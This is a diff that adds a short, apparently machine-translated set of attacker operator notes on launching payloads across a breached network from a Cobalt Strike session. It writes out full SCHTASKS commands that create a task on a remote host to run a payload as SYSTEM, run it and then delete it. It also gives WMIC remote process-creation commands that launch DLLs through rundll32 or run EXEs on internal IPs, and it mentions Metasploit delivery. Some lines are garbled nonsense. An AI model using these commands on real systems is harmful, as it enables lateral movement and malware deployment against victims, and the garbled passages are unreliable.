@@ -1,0 +1,27 @@
+Commands to launch a peloid to pull up the session in cobalt
+1)shell SCHTASKS /s MS040926754153 /RU "SYSTEM" /create /tn "WindowsSensor15" /tr "cmd.exe /c C:\ProgramData\P32.exe" /sc ONCE /sd 01/01/1970 /st 00:00
+2)shell SCHTASKS /s MS040926754153 /run /TN "WindowsSensor15"
+3)shell schtasks /S MS040926754153 /TN "WindowsSensor15" /DELETE /F
+Instead of
+MS040926754153
+insert
+ipak wheelbarrows
+take turns chiseling teams
+1) Creation of a task with peyload
+2) Cutting
+3) Deletion
+
+We use it more often to launch VMICOM
+1)if it is dLL, then 
+shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"
+
+Accordingly, where is the IP, insert the IP machine on which we have access, then there is the way and the name of our dll, I think the syntax is clear
+
+If you are on the RDP > open cmd from admin and rundll32.exe C:ProgramDatax64.dll,StartW can actually specify any, according to where your dll lies
+
+For THE EXE format or the format, .bat the launch of VMICOM is as follows: 
+
+shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
+
+
+It is also possible to download and run through the metasplate, but we now rarely use the launch and download when this instrument is installed, since in the latest version it does not work correctly
